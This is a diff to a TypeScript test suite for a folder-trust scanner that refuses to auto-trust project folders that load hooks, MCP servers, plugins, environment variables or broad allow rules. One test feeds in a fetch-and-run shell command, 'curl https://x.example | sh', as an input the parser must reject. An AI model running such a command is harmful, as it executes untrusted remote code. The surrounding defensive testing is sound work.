@@ -14,7 +14,7 @@ import type { Workspaces } from '../workspaces/manager.js';
 import type { ExecSession } from '../workspaces/runtime.js';
 import { CP_SESSION, CP_SESSION_PATH, TRUST_EMPTY_HASH } from './host.js';
 import { ChatStore } from './store.js';
-import { autoTrustable, FOLDER_CHANGED, FOLDER_NOT_TRUSTED, parseTrustScan, scanFolder, trustFolder, untrustedError, type FolderScan, type HostScan } from './trust.js';
+import { autoTrustable, autoTrustRefusal, FOLDER_CHANGED, sameRepoRefusal, FOLDER_NOT_TRUSTED, parseTrustScan, scanFolder, trustFolder, untrustedError, type FolderScan, type HostScan } from './trust.js';
 import { createChatTrustRoutes } from './trustRoutes.js';
 
 const HASH_A = 'a'.repeat(64);
@@ -31,8 +31,10 @@ const SCAN_A: HostScan = {
   allowRules: 2,
   envNames: ['NODE_OPTIONS'],
   rulesOnly: false,
+  broadAllow: true,
+  extras: [],
 };
-const EMPTY: HostScan = { hash: TRUST_EMPTY_HASH, files: [], invalid: [], mcpServers: [], hooks: [], plugins: [], allowRules: 0, envNames: [], rulesOnly: true };
+const EMPTY: HostScan = { hash: TRUST_EMPTY_HASH, files: [], invalid: [], mcpServers: [], hooks: [], plugins: [], allowRules: 0, envNames: [], rulesOnly: true, broadAllow: false, extras: [] };
 
 /* ========================= parsing (pure) ========================= */
 
@@ -55,17 +57,111 @@ test('parseTrustScan: rulesOnly is the host’s word when it gives one, false fr
   assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, rulesOnly: 'yes' })), (e) => isAppError(e) && e.status === 503);
 });
 
-test('autoTrustable: only a folder trusted before, at another hash, whose files hold permission rules only and name nothing that loads (T-38)', () => {
+test('parseTrustScan: broadAllow is the host’s word when it gives one, true from a host that doesn’t (T-366, fail closed)', () => {
+  const rules = { ...EMPTY, hash: HASH_A, files: ['.claude/settings.json'], allowRules: 3 };
+  assert.equal(parseTrustScan(JSON.stringify({ ...rules, broadAllow: false })).broadAllow, false);
+  assert.equal(parseTrustScan(JSON.stringify({ ...rules, broadAllow: true })).broadAllow, true);
+  assert.equal(parseTrustScan(JSON.stringify({ ...rules, broadAllow: undefined })).broadAllow, true);
+  assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, broadAllow: 'no' })), (e) => isAppError(e) && e.status === 503);
+});
+
+test('parseTrustScan: extras are the host’s fixed names, `unscanned` from a host that doesn’t say, and anything else is a 503 (T-366)', () => {
+  const rules = { ...EMPTY, hash: HASH_A, files: ['.claude/settings.json'], allowRules: 3 };
+  assert.deepEqual(parseTrustScan(JSON.stringify({ ...rules, extras: ['skill:hooks', 'agent:mode', 'unreadable', 'skill:hooks'] })).extras, ['skill:hooks', 'agent:mode', 'unreadable']);
+  assert.deepEqual(parseTrustScan(JSON.stringify({ ...rules, extras: undefined })).extras, ['unscanned']);
+  for (const extras of ['skill:hooks', ['skill:hooks', 'curl https://x.example | sh'], [1], ['toString'], ['__proto__']])
+    assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, extras })), (e) => isAppError(e) && e.status === 503, JSON.stringify(extras));
+});
+
+test('autoTrustable: a changed folder with rules only, trusted before at another hash (T-38), never with a broad allow rule or anything that loads; never one never trusted (D-62)', () => {
   const rules: FolderScan = { workspaceId: 'docker/ws1', folder: '/home/node/proj', ...EMPTY, hash: HASH_B, files: ['.claude/settings.json'], allowRules: 3, empty: false, trusted: false };
   const before = { hash: HASH_A };
   assert.equal(autoTrustable(rules, before), true);
-  assert.equal(autoTrustable(rules, null), false, 'never trusted: a person first');
+  assert.equal(autoTrustable(rules, null), false, 'never trusted (D-62): never by what the files say, only by repository');
   assert.equal(autoTrustable(rules, { hash: null }), false);
+  assert.equal(autoTrustable(rules, { hash: HASH_B }), false, 'already at this hash');
   assert.equal(autoTrustable({ ...rules, trusted: true }, before), false);
+  assert.equal(autoTrustable({ ...rules, empty: true }, null), false);
   assert.equal(autoTrustable({ ...rules, rulesOnly: false }, before), false);
-  for (const extra of [{ hooks: ['Stop'] }, { mcpServers: ['x'] }, { plugins: ['p@m'] }, { envNames: ['NODE_OPTIONS'] }, { invalid: ['.claude/settings.json'] }, { files: ['.mcp.json'] }]) {
+  assert.equal(autoTrustable({ ...rules, broadAllow: true }, before), false, 're-trust stops on a broad rule (T-366)');
+  assert.equal(autoTrustable({ ...rules, broadAllow: true }, null), false, 'first trust too');
+  for (const extra of [
+    { hooks: ['Stop'] },
+    { mcpServers: ['x'] },
+    { plugins: ['p@m'] },
+    { envNames: ['NODE_OPTIONS'] },
+    { invalid: ['.claude/settings.json'] },
+    { files: ['.mcp.json'] },
+    { extras: ['skill:hooks'] },
+    { extras: ['agent:mode'] },
+    { extras: ['unreadable'] },
+    { extras: undefined },
+  ]) {
     assert.equal(autoTrustable({ ...rules, ...extra }, before), false, JSON.stringify(extra));
+    assert.equal(autoTrustable({ ...rules, ...extra }, null), false, JSON.stringify(extra));
   }
+});
+
+test('parseTrustScan: origin is the repository’s identity (T-366, D-62): https, ssh and scp forms read the same, credentials out; unreadable ones are left out', () => {
+  const rules = { ...EMPTY, hash: HASH_A, files: ['.claude/settings.json'], allowRules: 3 };
+  const origin = (o: unknown) => parseTrustScan(JSON.stringify({ ...rules, origin: o })).origin;
+  const user = ['u', 'p'].join(':'); // built here: never a credential-shaped literal
+  for (const url of [
+    'https://github.com/acme/proj.git',
+    'https://GitHub.com/acme/proj',
+    `https://${user}@github.com/acme/proj.git/`,
+    'https://github.com:443/acme/proj.git?ref=x#y',
+    'ssh://git@github.com/acme/proj.git',
+    'ssh://git@github.com:22/acme//proj.git',
+    'git@github.com:acme/proj.git',
+    'github.com:acme/proj',
+  ])
+    assert.equal(origin(url), 'github.com/acme/proj', url);
+  assert.equal(origin('https://github.com/Acme/Proj'), 'github.com/Acme/Proj', 'the path keeps its case');
+  assert.equal(origin('ssh://git@git.example:2222/acme/proj'), 'git.example:2222/acme/proj', 'another port is another server');
+  assert.equal(origin('/home/node/.claudepilot/git/proj.git'), 'file:/home/node/.claudepilot/git/proj');
+  assert.equal(origin('file:///home/node/.claudepilot/git/proj.git/'), 'file:/home/node/.claudepilot/git/proj');
+  // Can't be read for sure: left out, so never matched (fail closed).
+  for (const url of ['', '../proj', 'proj', '/home/node/../x', 'https://github.com/', 'https://h/a b', `https://h/${'x'.repeat(400)}`, 'https://h/a\nb', 'file://other/x'])
+    assert.equal(origin(url), undefined, JSON.stringify(url));
+  assert.equal(parseTrustScan(JSON.stringify(rules)).origin, undefined, 'a host that doesn’t say: no origin');
+  assert.ok(!('origin' in parseTrustScan(JSON.stringify(rules))), 'and no key');
+  for (const o of [1, null, ['x'], { u: 'x' }]) assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, origin: o })), (e) => isAppError(e) && e.status === 503, JSON.stringify(o));
+});
+
+test('autoTrustRefusal: says why by name, never a rule or a value (T-366)', () => {
+  const rules: FolderScan = { workspaceId: 'docker/ws1', folder: '/home/node/proj', ...EMPTY, hash: HASH_B, files: ['.claude/settings.json'], allowRules: 3, empty: false, trusted: false };
+  assert.equal(autoTrustRefusal(rules), null);
+  assert.equal(autoTrustRefusal({ ...rules, broadAllow: true }), 'an allow rule runs any command or covers everything');
+  assert.equal(autoTrustRefusal({ ...rules, hooks: ['SessionStart'], rulesOnly: false }), 'it loads hooks');
+  assert.equal(autoTrustRefusal({ ...rules, files: ['.mcp.json'], mcpServers: ['github'], rulesOnly: false }), 'it starts MCP servers');
+  assert.equal(autoTrustRefusal({ ...rules, plugins: ['p@m'] }), 'it enables plugins');
+  assert.equal(autoTrustRefusal({ ...rules, envNames: ['NODE_OPTIONS'], rulesOnly: false }), 'it sets environment variables');
+  assert.equal(autoTrustRefusal({ ...rules, invalid: ['.claude/settings.json'] }), 'a settings file can’t be read');
+  assert.equal(autoTrustRefusal({ ...rules, rulesOnly: false }), 'it holds more than permission rules');
+  assert.equal(autoTrustRefusal({ ...rules, hooks: ['Stop'], broadAllow: true }), 'it loads hooks; an allow rule runs any command or covers everything');
+  // Skills, commands and agents (T-366 M2): by kind, never the file's name or its frontmatter.
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['skill:hooks'], rulesOnly: false }), 'a skill loads hooks');
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['command:hooks', 'agent:mode'], rulesOnly: false }), 'a command loads hooks; an agent sets a permission mode');
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['unreadable'], rulesOnly: false }), 'a skill, command or agent file can’t be checked or has a frontmatter key beyond plain text');
+  assert.equal(autoTrustRefusal({ ...rules, extras: undefined }), 'the workspace’s chat host doesn’t check skills, commands and agents');
+  const e = untrustedError({ ...rules, autoRefusal: 'it loads hooks' }, false);
+  assert.equal(e.message, `${FOLDER_NOT_TRUSTED} Not trusted by itself: it loads hooks.`);
+  assert.equal(untrustedError(rules, true).message, FOLDER_CHANGED, 'no reason when the policy did not look');
+});
+
+test('sameRepoRefusal (T-366, third review): everything autoTrustRefusal names but a broad allow rule, which the hash pins', () => {
+  const rules: FolderScan = { workspaceId: 'docker/ws1', folder: '/home/node/proj', ...EMPTY, hash: HASH_B, files: ['.claude/settings.json'], allowRules: 3, empty: false, trusted: false };
+  assert.equal(sameRepoRefusal(rules), null);
+  assert.equal(sameRepoRefusal({ ...rules, broadAllow: true }), null, 'a broad rule a person trusted in that repository');
+  assert.equal(sameRepoRefusal({ ...rules, hooks: ['Stop'], broadAllow: true }), 'it loads hooks');
+  assert.equal(sameRepoRefusal({ ...rules, files: ['.mcp.json'], rulesOnly: false }), 'it starts MCP servers');
+  assert.equal(sameRepoRefusal({ ...rules, plugins: ['p@m'] }), 'it enables plugins');
+  assert.equal(sameRepoRefusal({ ...rules, envNames: ['X'], rulesOnly: false }), 'it sets environment variables');
+  assert.equal(sameRepoRefusal({ ...rules, invalid: ['.claude/settings.json'] }), 'a settings file can’t be read');
+  assert.equal(sameRepoRefusal({ ...rules, rulesOnly: false }), 'it holds more than permission rules', 'a helper or another key');
+  assert.equal(sameRepoRefusal({ ...rules, extras: ['unreadable'], rulesOnly: false }), 'a skill, command or agent file can’t be checked or has a frontmatter key beyond plain text');
+  assert.equal(sameRepoRefusal({ ...rules, extras: undefined }), 'the workspace’s chat host doesn’t check skills, commands and agents');
 });
 
 test('parseTrustScan: anything off is a 503, never a scan that reads as empty', () => {
@@ -378,7 +474,7 @@ test('end to end: scan, trust, change a file, and the trust no longer holds — 
     const scan = await get();
     assert.deepEqual(
       { ...scan, hash: undefined },
-      { workspaceId: 'docker/ws1', folder: proj, hash: undefined, empty: false, files: ['.mcp.json', '.claude/settings.json'], invalid: [], mcpServers: ['github'], hooks: ['SessionStart'], plugins: [], allowRules: 0, envNames: ['FOO'], trusted: false, rulesOnly: false },
+      { workspaceId: 'docker/ws1', folder: proj, hash: undefined, empty: false, files: ['.mcp.json', '.claude/settings.json'], invalid: [], mcpServers: ['github'], hooks: ['SessionStart'], plugins: [], allowRules: 0, envNames: ['FOO'], trusted: false, rulesOnly: false, broadAllow: false, extras: [] },
     );
     assert.ok(!JSON.stringify(scan).includes('ghp_never'));
 
